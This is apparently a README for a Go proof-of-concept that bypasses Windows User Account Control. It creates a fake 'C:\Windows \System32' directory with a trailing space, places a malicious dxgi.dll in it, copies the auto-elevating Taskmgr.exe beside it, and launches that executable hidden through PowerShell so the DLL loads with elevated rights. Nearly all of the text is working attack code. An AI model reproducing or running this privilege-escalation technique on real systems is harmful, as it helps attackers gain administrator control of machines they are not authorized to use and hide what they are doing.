# Methods

## 1. Setup Mock Directory

The script creates the mock directory path within your drive
```go
cmd := exec.Command("cmd", "md \"\\\\?\\C:\\Windows \\System32\"")
cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
_, err = cmd.Output()
```

## 2. Move Malicious DLL

In this example, it moves the malicious "dxgi.dll" from the current directory to the mock directory
```go
sourcePath := filepath.Join(".", "dxgi.dll")
destinationPath := filepath.Join(mdirPath, "dxgi.dll")
if err := os.Rename(sourcePath, destinationPath); err != nil {
 fmt.Println("Error moving DLL: ", err)
    return
}
```

## 3. Copy Auto-Elevating Executable

This copies your executable from the legitimate System32 directory to your new illegitimate System32 directory
```go
cmd = exec.Command("cmd", "/c", "copy", "C:\\Windows\\System32\\Taskmgr.exe", mdirPath)
cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
output, err := cmd.CombinedOutput()
if err != nil {
 fmt.Println("Error copying Task Manager executable: ", err)
    return
}
```

## 4. Running Task Manager using Powershell

This code runs the executable you moved into your mock directory using powershell
```go
cmd = exec.Command("powershell", "Start-Process 'C:\\Windows \\System32\\Taskmgr.exe'")
cmd.SysProcAttr = &syscall.SysProcAttr{
 HideWindow:    true,
 CreationFlags: syscall.SW_HIDE,
}
err = cmd.Start()
if err != nil {
 fmt.Println("Error running Task Manager:", err)
    return
}
```

## 5. Summary

This proof of concept script demonstrates a method to bypass User Account Control (UAC) in Windows by leveraging the lack of DLL hash checking inside the System32 executables.
